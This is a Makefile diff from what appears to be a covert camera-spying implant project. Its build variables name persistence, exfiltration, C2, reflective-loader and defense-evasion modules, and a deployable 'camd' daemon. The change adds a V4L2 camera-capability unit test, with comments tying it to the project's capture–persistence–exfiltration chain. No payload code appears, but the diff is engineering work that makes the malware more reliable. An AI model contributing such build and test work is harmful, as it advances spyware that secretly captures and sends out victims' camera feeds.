@@ -105,8 +105,12 @@ DAEMON_DEPS := $(PERSIST_OBJ) $(EXFIL_OBJS) $(P2PLIB) $(C2OBJS) $(LATLIB)
 DEP_OBJS  := $(BUILD)/dep/loader_pe.o $(BUILD)/dep/loader_reflect.o \
              $(BUILD)/dep/defense_evade.o
 
+# test_v4l2_caps：V4L2 设备能力判定单测。
+# 它 #include 了 cam_linux_v4l2.c 以触达 static 判定函数，不链 PORT_OBJS
+# 之外的东西。必须进 all —— 这条判定是"这颗设备能不能采"的唯一把关点，
+# 判错不报错、只静默降级成合成帧，是采集链最坏的失效形态。
 TESTS     := test_pipeline test_linux_extra test_implant test_defend_win \
-             test_reflect_run test_cam_daemon
+             test_reflect_run test_cam_daemon test_v4l2_caps
 TEST_BINS := $(TESTS:%=$(BUILD)/%)
 
 # camd：部署用入口二进制（src/cam_daemon_main.c）。
@@ -175,6 +179,30 @@ $(BUILD)/synth_pe.o: tests/synth_pe.c tests/synth_pe.h | dirs
 
 $(BUILD)/test_%: tests/test_%.c $(PORT_OBJS) $(DEP_OBJS) $(BUILD)/synth_pe.o | dirs
 	$(CC) $(CFLAGS) $< $(PORT_OBJS) $(DEP_OBJS) $(BUILD)/synth_pe.o -o $@ $(LDLIBS)
+
+# test_v4l2_caps 显式规则：覆盖上面的通用模式规则。
+#
+# 该测试 #include 了 src/cam_linux_v4l2.c 以触达 static 判定函数（不这么做得
+# 为了可测而把生产代码的可见性改大，那是为测试污染设计）。因此它**不能再链**
+# cam_linux_v4l2.o —— 实测双重定义：
+#   multiple definition of `cam_source_create_v4l2' / `cam_source_destroy_v4l2'
+# 链接直接失败。故从 PORT_OBJS 里滤掉那一个 .o。
+#
+# -Wno-unused-function 只对本测试目标生效：整份 .c 被包含进来，而本测试只测
+# 其中三个函数，其余 static 函数在本 TU 内确实未被引用。不给 -Werror 之外，
+# 这条抑制不会掩盖别处的问题——其他目标仍是完整告警集。
+CAPS_OBJS := $(filter-out $(BUILD)/cam_linux_v4l2.o,$(PORT_OBJS))
+
+# src/cam_linux_v4l2.c 必须在依赖里。
+# 该测试用 #include 把它整体包含进来，若只依赖 tests/*.c，改了被包含的源码
+# make 不会重建——测试永远跑旧代码，改坏了也照样全绿。实测：注入"无条件读
+# device_caps"的旧缺陷后重跑，11 条断言**全部仍通过**，变异存活。这正是
+# 本仓库反复出现的"静默陈旧"缺陷，只是换了载体（include 而非链接）。
+$(BUILD)/test_v4l2_caps: tests/test_v4l2_caps.c src/cam_linux_v4l2.c \
+                         include/camera.h $(CAPS_OBJS) $(DEP_OBJS) \
+                         $(BUILD)/synth_pe.o | dirs
+	$(CC) $(CFLAGS) -Wno-unused-function $< $(CAPS_OBJS) $(DEP_OBJS) \
+	      $(BUILD)/synth_pe.o -o $@ $(LDLIBS)
 
 # cam_daemon 测试：显式规则，覆盖上面的通用模式规则。
 # 额外链入驻留 / 回传 / 信元三个上游模块，把「采集—驻留—回传」真正串起来。
